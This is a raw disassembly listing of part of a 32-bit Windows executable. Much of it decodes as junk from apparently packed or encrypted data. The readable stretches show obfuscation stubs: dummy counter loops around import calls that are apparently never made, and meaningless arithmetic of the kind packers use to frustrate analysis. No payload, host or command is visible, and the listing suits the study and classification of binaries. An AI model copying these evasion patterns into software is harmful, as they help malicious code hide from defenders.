  4030fd:	arpl   WORD PTR [edi+0x1c],ax
  403100:	idiv   DWORD PTR [esi]
  403102:	mov    edi,0x94ce6928
  403107:	pop    ebp
  403108:	mov    cl,0xc9
  40310a:	jecxz  0x403113
  40310c:	loop   0x4030cd
  40310e:	repnz push edi
  403110:	mov    ecx,gs
  403112:	adc    eax,0x4aa2746
  403117:	imul   esi,DWORD PTR ds:0xb1fb8e3a,0x34ea6a6a
  403121:	in     al,0x2f
  403123:	sbb    eax,0x7f8b628a
  403128:	or     al,0xd3
  40312a:	sbb    eax,0xfc218847
  40312f:	(bad)
  403132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403133:	outs   dx,DWORD PTR ds:[esi]
  403134:	ss js  0x403192
  403137:	cli    
  403138:	push   eax
  403139:	pop    es
  40313a:	xchg   edi,eax
  40313b:	imul   edi,edi,0x458bfe50
  403141:	enter  0xd8b,0xb0
  403145:	cmp    eax,DWORD PTR [ecx+0x0]
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x2d933ea4],0xdd
  40315f:	cmp    bh,BYTE PTR [edx-0x58181e9]
  403165:	jg     0x4031e5
  403167:	jle    0x4031e2
  403169:	cmp    DWORD PTR [ebx],ecx
  40316b:	sub    ebx,ebp
  40316d:	out    dx,al
  40316e:	mov    ecx,DWORD PTR [edx]
  403170:	xor    dl,bl
  403172:	mov    bl,0xe3
  403174:	inc    eax
  403175:	repz push cs
  403177:	pop    ecx
  403178:	stc    
  403179:	iret   
  40317a:	rcl    edx,cl
  40317c:	dec    eax
  40317d:	cmpps  xmm0,XMMWORD PTR [esi],0xf3
  403181:	sub    esp,DWORD PTR [esi+0x2ecfbe3d]
  403187:	xor    al,0x95
  403189:	into   
  40318a:	imul   ebp,edi,0xf59f97a2
  403190:	cmp    eax,0xe2ad0bdf
  403195:	cmp    eax,DWORD PTR ds:0x69a66f45
  40319b:	shr    DWORD PTR [ebp+0x55804c1b],cl
  4031a1:	mov    WORD PTR [ebp+edi*4+0x5039cf65],fs
  4031a8:	in     al,dx
  4031a9:	mov    ds,esp
  4031ab:	dec    edi
  4031ac:	pop    esp
  4031ad:	cmp    DWORD PTR ds:0xf05756ad,0x85c594b6
  4031b7:	dec    esi
  4031b8:	push   eax
  4031b9:	outs   dx,BYTE PTR es:[esi]
  4031bb:	rcr    BYTE PTR [edx],1
  4031bd:	adc    DWORD PTR [edx+0x7a],esi
  4031c0:	pop    edx
  4031c1:	adc    DWORD PTR [ebp+0x16],ebp
  4031c4:	sub    al,0xf7
  4031c6:	xchg   esp,eax
  4031c7:	sbb    BYTE PTR [edi],bl
  4031c9:	push   esi
  4031ca:	add    bh,BYTE PTR [ebx*2-0xf8ee7c6]
  4031d1:	lods   al,BYTE PTR ds:[esi]
  4031d2:	push   ds
  4031d3:	cmc    
  4031d4:	sbb    DWORD PTR [edi-0x9],ebx
  4031d7:	scas   al,BYTE PTR es:[edi]
  4031d8:	jne    0x403198
  4031da:	jb     0x4031da
  4031dc:	jecxz  0x4031c3
  4031de:	leave  
  4031df:	imul   ebp,DWORD PTR ds:0x5b663f57,0xb22c20ee
  4031e9:	rcl    BYTE PTR [eax],cl
  4031eb:	mov    ebp,0x11f1b280
  4031f0:	or     BYTE PTR [edx],al
  4031f2:	xor    eax,0x10983d6f
  4031f7:	mov    cl,0x93
  4031f9:	ins    DWORD PTR es:[edi],dx
  4031fa:	xchg   ebx,eax
  4031fb:	nop
  4031fc:	dec    ebp
  4031fd:	mov    dh,0xef
  4031ff:	xchg   BYTE PTR [ebp+0x79],al
  403202:	clc    
  403203:	push   0x6f8cb8a1
  403208:	div    DWORD PTR [esi+0x7ebbcf39]
  40320e:	sub    edi,edi
  403210:	add    BYTE PTR [esi],al
  403212:	cmp    BYTE PTR [edx+0x2],dh
  403215:	sahf   
  403216:	js     0x403222
  403218:	fisub  DWORD PTR [ebx+0x48]
  40321b:	fild   DWORD PTR [ebx]
  40321d:	pushf  
  40321e:	jnp    0x4031fb
  403220:	test   al,0x3f
  403222:	cld    
  403223:	into   
  403224:	add    DWORD PTR [ebx+0x2fe9a3cd],ecx
  40322a:	cdq    
  40322b:	(bad)  
  40322c:	xor    esp,DWORD PTR [esi+edi*8-0x41]
  403230:	jg     0x4031b9
  403232:	cmp    DWORD PTR [edi-0x7cd572f5],edx
  403238:	add    al,0x1e
  40323a:	sbb    BYTE PTR [edi+edx*8-0x7b],al
  40323e:	push   ebx
  40323f:	outs   dx,BYTE PTR ds:[esi]
  403240:	outs   dx,DWORD PTR ds:[esi]
  403241:	xchg   ecx,eax
  403242:	loope  0x403210
  403244:	xchg   esp,eax
  403245:	push   eax
  403246:	(bad)  
  403248:	sbb    dl,bl
  40324a:	into   
  40324b:	pop    esp
  40324c:	ret    
  40324d:	xor    BYTE PTR [edx-0x22a3b671],0xea
  403254:	and    DWORD PTR [ebp+edx*8-0x24],edi
  403258:	cdq    
  403259:	jns    0x403276
  40325b:	sti    
  40325c:	xor    dh,BYTE PTR [edi-0x44576823]
  403262:	js     0x4031f1
  403264:	in     al,dx
  403265:	mov    edi,0x4e84d3dc
  40326a:	fdiv   QWORD PTR [ecx]
  40326c:	adc    edx,DWORD PTR [edx]
  40326e:	jmp    0x40327d
  403270:	xchg   ebx,eax
  403271:	adc    ebp,esp
  403273:	xor    al,0x4b
  403275:	jecxz  0x40329a
  403277:	mov    al,0x8b
  403279:	cmp    al,0x4
  40327b:	push   edi
  40327c:	xchg   DWORD PTR [esi-0x14c6ddd],edi
  403282:	call   0x375c:0x60301d3b
  403289:	pop    eax
  40328a:	push   esp
  40328b:	add    ebp,ebx
  40328d:	jno    0x403280
  40328f:	mov    ebp,0x5f94897d
  403294:	fimul  WORD PTR [edi+0x34dd8f59]
  40329a:	inc    edx
  40329b:	add    eax,0x18c12d1b
  4032a0:	std    
  4032a1:	(bad)  
  4032a2:	(bad)  
  4032a3:	sub    cl,cl
  4032a5:	addr16 loope 0x4032a3
  4032a8:	xchg   edx,eax
  4032a9:	out    dx,eax
  4032aa:	lock push cs
  4032ac:	mov    bl,0x26
  4032ae:	sbb    ch,BYTE PTR [ecx-0x47166df5]
  4032b4:	add    eax,0x17504595
  4032b9:	inc    ecx
  4032ba:	(bad)  
  4032bb:	out    0x5e,eax
  4032bd:	mov    al,0xea
  4032bf:	not    DWORD PTR [edx+0x2aeb639c]
  4032c5:	or     esp,ecx
  4032c7:	dec    ebp
  4032c8:	test   DWORD PTR gs:[ebx],ebp
  4032cb:	sub    DWORD PTR [ebp+0x1486291a],esi
  4032d1:	inc    esp
  4032d2:	or     eax,0xf54e51e7
  4032d7:	jp     0x403304
  4032d9:	push   esp
  4032da:	add    DWORD PTR [edi],ecx
  4032dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032dd:	(bad)  
  4032de:	jo     0x403353
  4032e0:	int    0xb5
  4032e2:	shr    BYTE PTR [edi+ebx*8],1
  4032e5:	cs bnd jg 0x4032d9
  4032e9:	inc    eax
  4032ea:	xchg   DWORD PTR [ebp+0x5e],ebp
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x75802b76]
  403537:	fistp  QWORD PTR [eax+0x7e7e15c6]
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x403575
  403542:	icebp  
  403543:	xlat   BYTE PTR ds:[ebx]
  403544:	leave  
  403545:	xchg   esi,eax
  403546:	cmp    eax,0x4333dd25
  40354b:	loopne 0x40358b
  40354d:	(bad)  
  40354e:	and    BYTE PTR [edx],bl
  403550:	dec    esi
  403551:	jne    0x403520
  403553:	iret   
  403554:	lods   eax,DWORD PTR ds:[esi]
  403555:	mov    al,0xb5
  403557:	sub    eax,0x19ebb2f
  40355c:	mov    ah,0x77
  40355e:	mov    al,ds:0xd828aba8
  403563:	sbb    eax,0x7d83137c
  403568:	cmp    eax,DWORD PTR [esi-0x6243e84c]
  40356e:	(bad)  
  403570:	dec    esp
  403571:	pop    eax
  403572:	and    ch,cl
  403574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403575:	push   eax
  403576:	push   ebp
  403577:	jne    0x4035ec
  403579:	cdq    
  40357a:	mov    ah,0x7a
  40357c:	loope  0x403516
  40357e:	and    al,BYTE PTR [edx+0x2]
  403581:	adc    BYTE PTR [eax],0x3a
  403584:	adc    esi,DWORD PTR [ebx+ebp*4]
  403587:	xor    DWORD PTR [ebx-0x786afe75],edx
  40358d:	adc    DWORD PTR [esi],ebp
  40358f:	dec    edx
  403590:	leave  
  403591:	xchg   esi,eax
  403592:	retf   
  403593:	xor    eax,0x20549e08
  403598:	stc    
  403599:	dec    ebx
  40359a:	push   ds
  40359b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40359c:	shl    DWORD PTR [ebx-0x455f1196],cl
  4035a2:	test   edi,esi
  4035a4:	push   es
  4035a5:	jecxz  0x403569
  4035a7:	mov    esp,0xefbfbf09
  4035ac:	out    0x39,eax
  4035ae:	je     0x403614
  4035b0:	mov    WORD PTR ds:0x323d9239,cs
  4035b6:	add    eax,DWORD PTR [eax-0x70]
  4035b9:	and    DWORD PTR [eax+ebx*1],edx
  4035bc:	push   es
  4035bd:	imul   edx,DWORD PTR [ebx],0xffffffa1
  4035c0:	dec    edi
  4035c1:	jp     0x403610
  4035c3:	adc    al,0x8a
  4035c5:	in     al,0x35
  4035c7:	aas    
  4035c8:	push   eax
  4035c9:	in     al,0x3f
  4035cb:	mov    ebp,ebp
  4035cd:	(bad)  
  4035ce:	pushf  
  4035cf:	(bad)  
  4035d0:	test   BYTE PTR [esi-0x39a8d1f0],0x8
  4035d7:	mov    bl,0xbe
  4035d9:	or     ch,BYTE PTR [edi+0x65]
  4035dc:	jae    0x403626
  4035de:	inc    eax
  4035df:	mov    al,ds:0xa94a0921
  4035e4:	test   eax,0x45bcbd2e
  4035e9:	or     al,0x2
  4035eb:	and    ebp,DWORD PTR [esi]
  4035ed:	xchg   esp,eax
  4035ee:	xor    ch,BYTE PTR [ebp-0x6c]
  4035f1:	ds hlt 
  4035f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035f4:	xor    al,0x5d
  4035f6:	fs jmp 0x403610
  4035f9:	cli    
  4035fa:	push   ebp
  4035fb:	psrad  mm4,mm5
  4035fe:	mov    esi,0x928305e0
  403603:	and    DWORD PTR [edi],esp
  403605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403606:	lahf   
  403607:	and    al,0xf1
  403609:	adc    DWORD PTR [esi+0x1d26b96d],edx
  40360f:	xchg   esp,eax
  403610:	hlt    
  403611:	mov    al,0xac
  403613:	push   0xffffffb8
  403615:	or     BYTE PTR [edx+0x32],ah
  403618:	fidiv  DWORD PTR [ebp-0x14]
  40361b:	push   edi
  40361c:	adc    ebx,DWORD PTR [edx+0xc]
  40361f:	inc    ecx
  403620:	dec    eax
  403621:	cli    
  403622:	dec    ecx
  403623:	int3   
  403624:	mov    edx,0x51b331a2
  403629:	or     edi,eax
  40362b:	mov    cl,0xde
  40362d:	je     0x403645
  40362f:	mov    cl,0xef
  403631:	inc    cl
  403633:	fidiv  DWORD PTR [esi]
  403635:	sbb    eax,0xa2c54c6a
  40363a:	mov    dh,0x9d
  40363c:	nop
  40363d:	adc    al,0x1d
  40363f:	pushf  
  403640:	or     cl,BYTE PTR [edi-0x52]
  403643:	cmp    DWORD PTR [esp+ebx*2-0x18],esp
  403647:	sub    eax,0x19c3f8a8
  40364c:	dec    edx
  40364d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40364e:	imul   edi,DWORD PTR [ebp-0x77],0x7e
  403652:	jmp    0xac7e18b4
  403657:	adc    eax,0x21ac9bbd
  40365c:	add    BYTE PTR [esi-0x7d8add08],dh
  403662:	int3   
  403663:	add    dl,BYTE PTR [edx]
  403665:	out    0x70,al
  403667:	cmp    eax,DWORD PTR [eax]
  403669:	push   edx
  40366a:	frstor [eax+0x52]
  40366d:	mov    DWORD PTR ds:0x79608975,edi
  403673:	sub    ebp,DWORD PTR [esi]
  403675:	sub    DWORD PTR [ebx],ebp
  403677:	outs   dx,DWORD PTR ds:[esi]
  403678:	jmp    0x403611
  40367a:	fistp  WORD PTR [eax+esi*8-0x40]
  40367e:	jl     0x40364b
  403680:	imul   ebp,edx,0xeaf5468e
  403686:	add    eax,0xc4a53cdf
  40368b:	sub    DWORD PTR [esi-0x23],ebp
  40368e:	mov    edi,0x3251e3c0
  403693:	fld    st(1)
  403695:	xor    ebx,DWORD PTR [edi-0x1d]
  403698:	cmp    al,0xe
  40369a:	cdq    
  40369b:	adc    edi,DWORD PTR [esi]
  40369d:	cmove  esi,DWORD PTR [edx+0x6dcf03]
  4036a4:	add    dh,0xd7
  4036a7:	mov    al,0x24
  4036a9:	jnp    0x403718
  4036ab:	push   esp
  4036ac:	fs push ss
  4036ae:	fidivr WORD PTR [eax-0xd8c86d4]
  4036b4:	inc    ecx
  4036b5:	repnz retf 0x9807
  4036b9:	ja     0x4036fe
  4036bb:	add    ebp,DWORD PTR [edx+0x1b2e0678]
  4036c1:	jecxz  0x40372f
  4036c3:	in     eax,dx
  4036c4:	daa    
  4036c5:	cmp    eax,0x9dbc78a0
  4036ca:	nop
  4036cb:	or     DWORD PTR [ebx],0xdeb7f71d
  4036d1:	pop    es
  4036d2:	xor    al,0xbe
  4036d4:	mov    ds,esi
  4036d6:	lods   al,BYTE PTR ds:[esi]
  4036d7:	int    0xcc
  4036d9:	mov    esi,0x65b5625
  4036de:	inc    eax
  4036df:	into   
  4036e0:	xchg   DWORD PTR [edx+0x40],edi
  4036e3:	xor    ebp,esp
  4036e5:	stc    
  4036e6:	mov    DWORD PTR [ebx+0x2e],ebx
  4036e9:	dec    esp
  4036ea:	pcmpgtd mm2,mm5
  4036ed:	loopne 0x40370d
  4036ef:	mov    ebx,0xd7bfae85
  4036f4:	push   edx
  4036f5:	jo     0x403757
  4036f7:	es retf 0xfc35
  4036fb:	sbb    eax,0x96a771f0
  403700:	or     DWORD PTR [edx-0x1e0e66fe],esi
  403706:	xchg   ebx,eax
  403707:	xchg   esp,eax
  403708:	(bad)  
  403709:	xor    al,0x54
  40370b:	std    
  40370c:	dec    edi
  40370d:	xor    eax,0xae542fb2
  403712:	inc    ecx
  403713:	jle    0x403719
  403715:	or     al,0x1f
  403717:	cwde   
  403718:	out    dx,eax
  403719:	and    eax,0x51c72e18
  40371e:	ins    BYTE PTR es:[edi],dx
  40371f:	mov    dh,0xb3
  403721:	out    0x1d,eax
  403723:	test   DWORD PTR [edi+0x47],0xaf5151d1
  40372a:	cmp    eax,0x5cbb1ae7
  40372f:	pop    eax
  403730:	sub    eax,0x3874ac6b
  403735:	adc    al,0xa4
  403737:	mov    bl,BYTE PTR [ebx-0x33]
  40373a:	imul   esi,DWORD PTR [ebx-0x7e],0x53
  40373e:	pop    ecx
  40373f:	in     eax,dx
  403740:	pop    ds
  403741:	push   cs
  403742:	clc    
  403743:	inc    ecx
  403744:	push   edi
  403745:	repz cli 
  403747:	mov    dl,0x40
  403749:	mov    edi,0x2325732d
  40374e:	repz mov ecx,0xa58bc953
  403754:	retf   
  403755:	(bad)  
  403757:	test   DWORD PTR [edx+0x6f25c036],ecx
  40375d:	fs sub eax,0xcd9dde4f
  403763:	push   ds
  403764:	inc    esp
  403765:	daa    
  403766:	and    al,0xf2
  403768:	stc    
  403769:	xchg   edi,eax
  40376a:	push   esi
  40376b:	add    DWORD PTR [ebx-0x4],ebp
  40376e:	pop    ebp
  40376f:	xchg   ecx,edi
  403771:	stos   BYTE PTR es:[edi],al
  403772:	jo     0x40379a
  403774:	jmp    0x6775a2a3
  403779:	dec    ebp
  40377a:	xchg   esi,eax
  40377b:	scas   al,BYTE PTR es:[edi]
  40377c:	loope  0x4037ba
  40377e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40377f:	adc    edi,DWORD PTR [ecx]
  403781:	mov    dh,0x80
  403783:	inc    edx
  403784:	mov    ebx,0x78a70d3
  403789:	pop    eax
  40378a:	sbb    bh,0xdf
  40378d:	int    0x7c
  40378f:	add    esi,edi
  403791:	inc    esp
  403792:	xor    edi,eax
  403794:	lods   eax,DWORD PTR ds:[esi]
  403795:	test   eax,0x28deba74
  40379a:	(bad)  
  40379b:	icebp  
  40379c:	jmp    0x9e580ede
  4037a1:	sub    al,ah
  4037a3:	fwait
  4037a4:	xchg   ebp,eax
  4037a5:	jno    0x40376c
  4037a7:	xchg   edi,eax
  4037a8:	out    dx,eax
  4037a9:	jno    0x4037ae
  4037ab:	fwait
  4037ac:	mov    ch,0x75
  4037ae:	inc    ecx
  4037af:	(bad)  
  4037b0:	fadd   DWORD PTR [eax]
  4037b2:	sbb    eax,0x3b949b0f
  4037b7:	das    
  4037b8:	int    0xd4
  4037ba:	xchg   edx,eax
  4037bb:	outs   dx,BYTE PTR ds:[esi]
  4037bc:	adc    DWORD PTR [ebp+0x4abed171],esi
  4037c2:	int3   
  4037c3:	mov    ebx,0xc16b83f7
  4037c8:	sbb    BYTE PTR [ecx],ah
  4037ca:	out    dx,eax
  4037cb:	xor    ecx,DWORD PTR [edi-0x7d10c722]
  4037d1:	or     dh,BYTE PTR [ebx-0x27]
  4037d4:	(bad)  
  4037d6:	xor    eax,0xef4bd486
  4037db:	test   al,0xc4
  4037dd:	push   esi
  4037de:	lahf   
  4037df:	(bad)  
  4037e0:	mov    cs,WORD PTR [edx-0x4]
  4037e3:	sub    BYTE PTR [ecx],0xb5
  4037e6:	jns    0x40376d
  4037e8:	push   edi
  4037e9:	cwde   
  4037ea:	push   ebp
  4037eb:	push   0xdefccfe1
  4037f0:	enter  0x1f6e,0x57
  4037f4:	and    BYTE PTR cs:[ebx],bl
  4037f7:	js     0x403876
  4037f9:	sub    ebp,DWORD PTR [ebx-0x63]
  4037fc:	test   DWORD PTR [esi+0x6],ebp
  4037ff:	ficom  DWORD PTR [eax]
  403801:	cs cmp eax,0x7fc0c279
  403807:	mov    bl,0xf9
  403809:	mov    ch,BYTE PTR [ebx+edx*2+0x4bd1ccb2]
  403810:	mov    ecx,0xff4b2960
  403815:	(bad)  
  403816:	xor    DWORD PTR [edi+edx*2+0x12c3470e],esi
  40381d:	aad    0xf8
  40381f:	scas   eax,DWORD PTR es:[edi]
  403820:	sub    DWORD PTR [bp+si+0x2219],esi
  403825:	adc    eax,0xc445c762
  40382a:	cmp    BYTE PTR [ebp+0x3d1bf89c],al
  403830:	sti    
  403831:	ss inc ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
